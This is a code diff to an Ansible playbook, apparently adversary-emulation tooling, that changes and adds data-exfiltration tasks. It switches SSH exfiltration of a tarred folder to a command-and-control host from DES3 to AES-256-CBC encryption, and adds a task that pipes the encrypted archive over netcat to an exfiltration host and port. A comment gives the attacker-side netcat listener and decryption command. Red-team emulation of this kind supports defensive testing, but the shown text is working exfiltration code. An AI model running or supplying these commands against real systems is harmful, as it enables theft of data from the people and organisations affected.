@@ -10,6 +10,11 @@
       register: exfil_check
     - name: Exfiltration Over Alternative Protocol - SSH
       shell: |
-        tar czpf - {{ exfiltration_folder }}/* | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}.tar.gz.enc'
-        # decrypt file on cnc: openssl des3 -d -salt -k {{ password_encryption }} -in {{ exfiltration_file }}.tar.gz.enc -out {{ exfiltration_file }}tar.gz    
+        tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}.tar.gz.enc'
+        # decrypt file on cnc: openssl aes-256-cbc -d -salt -k {{ password_encryption }} -in {{ exfiltration_file }}.tar.gz.enc -out {{ exfiltration_file }}tar.gz    
+      when: exfil_check.stat.exists
+    - name: Exfiltration Over Alternative Protocol - SSL/443
+      shell: |
+        tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | nc -w1 {{ exfil_fqdn }} {{ exfil_port }}
+        # attacker: nc -lp {{ exfil_port }} |openssl aes-256-cbc -d -k $pass {{ password_encryption }} > {{ exfiltration_file }}.tar.gz.enc
       when: exfil_check.stat.exists
